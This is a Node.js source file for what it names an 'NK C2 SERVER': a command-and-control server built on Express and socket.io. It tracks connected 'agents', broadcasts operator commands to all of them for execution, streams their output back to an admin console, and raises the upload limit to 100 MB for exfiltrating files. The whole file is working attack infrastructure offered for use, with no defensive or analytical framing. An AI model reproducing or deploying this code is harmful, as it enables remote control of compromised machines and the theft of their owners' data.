
// --- NK C2 SERVER (REAL TIME + PERSISTENT + EXFIL) ---
// UPDATED: 2025-12-04T12:27:54.080Z
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
// Increase buffer size for large file downloads (Exfiltration)
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // 100 MB Limit
});

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

let agents = new Map();

io.on('connection', (socket) => {
    console.log('[SOCK] New Connection: ' + socket.id);

    // 1. Identificação
    socket.on('identify', ({ type, id }) => {
        if (type === 'agent') {
            agents.set(socket.id, id);
            console.log(`[AGENT] Online: ${id}`);
            io.emit('log', `[SYSTEM] AGENT CONNECTED: ${id} (Secure Link)`);
        } else {
            console.log('[CONSOLE] Admin UI Connected');
        }
    });

    // 2. Comandos (UI -> Agent)
    socket.on('cmd', (data) => {
        console.log(`[CMD] Dispatching: ${data.cmd}`);
        io.emit('exec', data); // Broadcast to all agents
    });

    // 3. Logs em Tempo Real (Agent -> UI)
    socket.on('stream_log', (data) => {
        // data = { output: "line of text", from: "agent_id" }
        io.emit('log', data.output);
    });

    socket.on('disconnect', () => {
        if (agents.has(socket.id)) {
            const id = agents.get(socket.id);
            io.emit('log', `[SYSTEM] AGENT LOST: ${id}`);
            agents.delete(socket.id);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK C2 Server running on port ${PORT}`));
